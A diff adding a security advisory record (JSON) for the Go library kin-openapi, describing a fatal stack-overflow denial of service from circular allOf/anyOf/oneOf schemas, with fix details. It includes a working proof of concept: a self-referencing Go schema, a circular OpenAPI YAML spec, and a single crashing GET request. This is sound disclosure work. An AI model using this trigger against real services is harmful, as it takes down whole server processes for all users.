@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-g8cf-rcjf-c8cf",
+  "modified": "2026-10-15T20:30:04.351750747Z",
+  "published": "2026-10-15T20:20:37Z",
+  "aliases": [
+    "CVE-2026-100354"
+  ],
+  "summary": "kin-openapi: Uncontrolled Recursion on Circular allOf/anyOf/oneOf Schemas Causes Fatal Process Crash",
+  "details": "## Summary\n\nkin-openapi's spec loader and spec-time validator both handle circular schema references safely: the loader resolves circular `$ref`s on purpose (to support recursive data structures), and `Schema.validate()` uses stack-based cycle detection. `Validate()` therefore accepts a schema whose `allOf` / `anyOf` / `oneOf` chain refers back to itself, returning no error.\n\nThe runtime validators do not have that protection. When such a schema is used for request or response validation, the recursion through the combinator chain is unbounded. In Go this produces a **fatal stack overflow** (`runtime: goroutine stack exceeds ... limit` / `fatal error: stack overflow`), which is **not** a recoverable panic. `recover()` cannot catch it, so `net/http`'s per-connection recovery does not help. The entire process is terminated, including all goroutines serving unrelated clients.\n\nTwo independent unguarded recursion sites were confirmed:\n\n1. `openapi3/schema.go` — `visitJSON` / `visitXOFOperations` (reached by `VisitJSON`, i.e. response validation and direct schema validation).\n2. `openapi3filter/req_resp_decoder.go` — `decodeValue` (reached first during request parameter decoding). The report also identifies the same gap in `urlValuesDecoder.parseValue` and `buildResObj`/`buildFromSchemas`.\n\n## Details \n### Root Cause\n\n`Schema.validate()` has cycle detection (`openapi3/schema.go:1396`):\n\n```go\nfunc (schema *Schema) validate(ctx context.Context, stack []*Schema) ([]*Schema, error) {\n\tif slices.Contains(stack, schema) {\n\t\treturn stack, nil\n\t}\n\t// ...\n\tstack = append(stack, schema)\n```\n\nThe runtime visitor has none. `visitJSON` (line 1951) calls `visitXOFOperations` (line 2189), which iterates the combinator slice and calls `visitJSON` again on each sub-schema:\n\n```go\nfunc (schema *Schema) visitXOFOperations(settings *schemaValidationSettings, value any) (err error, run bool) {\n\t// ...\n\tfor idx, item := range v { // v = schema.OneOf / AnyOf / AllOf\n\t\tv := item.Value\n\t\t// no check for item.Value == schema (or any ancestor)\n\t\tif err := v.visitJSON(settings, tempValue); err != nil { // recurses forever on a cycle\n```\n\nThe request-decoding path has the same structure in `decodeValue` (`openapi3filter/req_resp_decoder.go:270`):\n\n```go\nfunc decodeValue(dec valueDecoder, param string, sm *openapi3.SerializationMethod, schema *openapi3.SchemaRef, required bool) (any, bool, error) {\n\tif len(schema.Value.AllOf) \u003e 0 {\n\t\tfor _, sr := range schema.Value.AllOf {\n\t\t\tvalue, f, err = decodeValue(dec, param, sm, sr, required) // no cycle check\n```\n\n## Proof of Concept\n\n### Environment\n\n- kin-openapi v0.144.0 (tag `v0.144.0`, commit `f0407d5`)\n- Go 1.26.7\n\n### Path A: response / direct schema validation (`VisitJSON`)\n\nA schema whose `allOf` refers to itself. `Validate()` is called first to show the schema is accepted, then `VisitJSON()`:\n\n```go\nrecursiveSchema := \u0026openapi3.Schema{\n\tType:       \u0026openapi3.Types{\"object\"},\n\tProperties: openapi3.Schemas{\"name\": {Value: \u0026openapi3.Schema{Type: \u0026openapi3.Types{\"string\"}}}},\n}\nrecursiveSchema.AllOf = openapi3.SchemaRefs{{Value: recursiveSchema}} // circular\n\n_ = recursiveSchema.Validate(ctx)                       // accepted, no error\n_ = recursiveSchema.VisitJSON(map[string]any{\"name\": \"test\"}) // crashes\n```\n\nOutput:\n\n```\nValidate() ACCEPTED the circular schema (no error) -- spec-time cycle detection tolerates it\nCalling VisitJSON() -- expect fatal stack overflow (unrecoverable)...\nruntime: goroutine stack exceeds 1000000000-byte limit\nfatal error: stack overflow\n\ngoroutine 1 [running]:\ngithub.com/getkin/kin-openapi/openapi3.(*Schema).visitJSON(...)\n\topenapi3/schema.go:1951\ngithub.com/getkin/kin-openapi/openapi3.(*Schema).visitXOFOperations(...)\n\topenapi3/schema.go:2309\ngithub.com/getkin/kin-openapi/openapi3.(*Schema).visitJSON(...)\n\topenapi3/schema.go:1981\ngithub.com/getkin/kin-openapi/openapi3.(*Schema).visitXOFOperations(...)\n\topenapi3/schema.go:2309\n... (repeats until stack overflow)\n```\n\nA `defer recover()` placed around the call did **not** catch the fatal error — the process aborted with a non-zero exit code, confirming it is unrecoverable.\n\n### Path B: HTTP request validation against a loaded spec (realistic delivery)\n\nA legal OAS 3.0 spec with a circular `allOf` `$ref`, loaded normally, served behind a standard `net/http` handler using `openapi3filter.ValidateRequest`:\n\n```yaml\nopenapi: '3.0.0'\ninfo: { title: Circular allOf crash PoC, version: '1.0' }\npaths:\n  /test:\n    get:\n      parameters:\n        - name: data\n          in: query\n          schema: { $ref: '#/components/schemas/Recursive' }\n      responses: { '200': { description: OK } }\ncomponents:\n  schemas:\n    Recursive:\n      type: object\n      allOf:\n        - $ref: '#/components/schemas/Recursive'\n      properties:\n        name: { type: string }\n```\n\nA single `GET /test?data=x` crashes the whole server process:\n\n```\nValidate() ACCEPTED the spec with circular allOf $ref\nSending GET /test?data=x through a real net/http server...\nruntime: goroutine stack exceeds 1000000000-byte limit\nfatal error: stack overflow\n...\ngithub.com/getkin/kin-openapi/openapi3filter.decodeValue(...)\n\topenapi3filter/req_resp_decoder.go:278\ngithub.com/getkin/kin-openapi/openapi3filter.decodeValue(...)\n\topenapi3filter/req_resp_decoder.go:278\n... (repeats until stack overflow)\n```\n\nThe line printed after the request (\"the process survived\") was never reached, and the process exited with a non-zero code — the standard `net/http` per-connection `recover()` did not save it. This is the key distinction from a recoverable panic: a fatal stack overflow takes the entire process down regardless of host.\n\n### Fix verification\n\nAdding stack-based cycle detection to both sites (matching `validate()`'s pattern) eliminated the crash:\n\n- `visitJSON` guard: `VisitJSON()` returned normally instead of crashing.\n- `decodeValue` guard: the same `GET /test?data=x` returned a clean `400`:\n\n```\nResponse: 400 \"invalid: parameter \\\"data\\\" in query has an error: circular schema reference detected while decoding\"\nIf you see this line, the process survived.\n```\n\n## Impact\n\nAn unrecoverable, whole-process denial of service. Because the crash is a fatal Go runtime error (not a panic), it cannot be contained by `net/http`'s per-request recovery, so **A:H applies to all host types**, unlike a recoverable-panic bug.\n\nAttack surface, in order of exposure:\n\n- **Applications that load OpenAPI specs from untrusted or semi-trusted sources** (API gateways, spec linters/validators, mock servers, documentation generators). An attacker supplies a spec containing a circular combinator, and any subsequent request/response validation crashes the service. This is the primary remote-attacker scenario.\n- **Applications serving a fixed, trusted spec that happens to contain a circular `allOf`/`anyOf`/`oneOf`.** Here any client request to the affected endpoint crashes the process. The spec author does not need malicious intent; a degenerate recursive combinator is enough. This is a latent reliability bug that becomes remotely triggerable once present.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/getkin/kin-openapi",
+        "purl": "pkg:golang/github.com/getkin/kin-openapi"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.149.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-g8cf-rcjf-c8cf/GHSA-g8cf-rcjf-c8cf.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getkin/kin-openapi/security/advisories/GHSA-g8cf-rcjf-c8cf"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100354"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getkin/kin-openapi/commit/9245cef66c840e27a08409a8a5cd0ee930c5bcff"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getkin/kin-openapi"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getkin/kin-openapi/releases/tag/v0.149.0"
+    }
+  ]
+}
